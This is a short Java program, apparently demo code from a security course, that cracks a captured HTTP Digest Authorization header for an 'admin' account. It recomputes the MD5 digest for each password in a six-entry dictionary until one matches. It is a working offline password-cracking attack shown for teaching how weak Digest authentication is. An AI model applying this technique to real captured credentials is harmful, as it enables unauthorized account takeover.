package com.pluralsight.security.hacking;

import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.List;

import org.springframework.security.crypto.codec.Hex;

public class DigestAuthBruteFoce {

	
	public static void main(String[] args) {
		/**
		 * Authorization: Digest username="admin", realm="admin-digest-realm", nonce="MTUzMjI5NjM2MTcxNzo3ZDlhNzUwZGY4MWZjNGEzYTg5YWI4MDZjODk1MWY4NA==", 
		 * uri="/support/admin", response="60ec3a5cc435259614a6b4f8d2ce984f", qop=auth, nc=00000002, cnonce="45048818728ca33e"
		 */
		String uri = "/support/admin";
		String httpMethod = "GET";
		String nonce = "MTUzMjI5NjM2MTcxNzo3ZDlhNzUwZGY4MWZjNGEzYTg5YWI4MDZjODk1MWY4NA==";
		String username = "admin";
		String realm = "admin-digest-realm";
		String cnonce = "45048818728ca33e";
		String nc= "00000002";
		String qop = "auth";
		
		String expectedDigest = "60ec3a5cc435259614a6b4f8d2ce984f";
		for(String password: getDictionaryPasswords()) {
			//HA1=MD5(username:realm:password)
			String ha1 = generateHa1(username, realm, password);
			//HA2=MD5(method:digestURI)
			String ha2 = generateHa2(httpMethod, uri);
			//response=MD5(HA1:nonce:HA2) 
			String digest = generateDigest(ha1, nonce, ha2,nc,cnonce,qop);
			System.out.println("Generated digest: "+digest);
			if(digest.equals(expectedDigest)) {
				System.out.println("Password found: "+password);
				break;
			}
		}
		
	}
	
	private static String generateDigest(String ha1, String nonce, String ha2, String nc, String cnonce, String qop) {
		return md5Hex(ha1 + ":" + nonce + ":" + nc + ":" + cnonce + ":" + qop + ":"+ha2);
	}
	
	private static String generateHa1(String username, String realm, String password) {
		return md5Hex(username + ":" + realm + ":" + password);
	}
	
	private static String generateHa2(String httpMethod, String uri) {
		return md5Hex(httpMethod + ":" + uri);
	}
	
	private static List<String> getDictionaryPasswords() {
		java.util.List<String> passwords = new ArrayList<String>();
		passwords.add("123456");
		passwords.add("pa55word");
		passwords.add("qwerty");
		passwords.add("passsword");
		passwords.add("password1");
		passwords.add("password2");
		return passwords;
	}
	
	private static String md5Hex(String data) {
		MessageDigest digest = null;
		try {
			digest = MessageDigest.getInstance("MD5");
		}
		catch (NoSuchAlgorithmException e) {
			e.printStackTrace();
		}
		return new String(Hex.encode(digest.digest(data.getBytes())));
	}
	
}
